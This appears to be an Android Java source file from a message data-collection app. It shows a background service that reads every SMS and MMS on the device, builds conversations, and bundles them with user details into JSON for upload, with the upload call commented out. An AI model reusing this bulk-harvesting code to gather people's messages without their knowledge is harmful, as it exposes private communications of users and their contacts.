package com.example.messagesiphon.datacollection;

import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

/**
 * MessageService is an intentService which will run message collection and
 * uploading on its on worker thread.
 * 
 */
public class MessageService extends IntentService
{
	public MessageService()
	{
		super("MessageService");
	}

	protected void onHandleIntent(Intent intent)
	{

		Sms sms = new Sms();
		Mms mms = new Mms();
		User theUser = new User(this);
		ConstructConversation conversationConstruct = new ConstructConversation();
		List<MessageU> smsMessages = sms.getSms(this, theUser);// list of all
																// sms messages
		List<MessageU> mmsMessages = mms.getMms(this, theUser);// list of all
																// mms messages
		smsMessages.addAll(mmsMessages);// list of all messages
		List<Conversation> conversationList = conversationConstruct
				.construct(smsMessages);// messages to conversations
		JSONArray arr = new JSONArray();
		for (Conversation conversation : conversationList)
		{
			arr.put(conversation.toJson());// conversations to json
		}
		JSONObject uploadData = new JSONObject();
		try
		{
			uploadData.put("conversation", arr);
			uploadData.put("user", theUser.getUser());
		}
		catch (JSONException e1)
		{
			Log.i("json", "json Exception");
			e1.printStackTrace();
		}
		Log.i("test", "i think it is working");
		// Upload upload = new Upload(uploadData);
		// upload.post();//json to server
	}
}
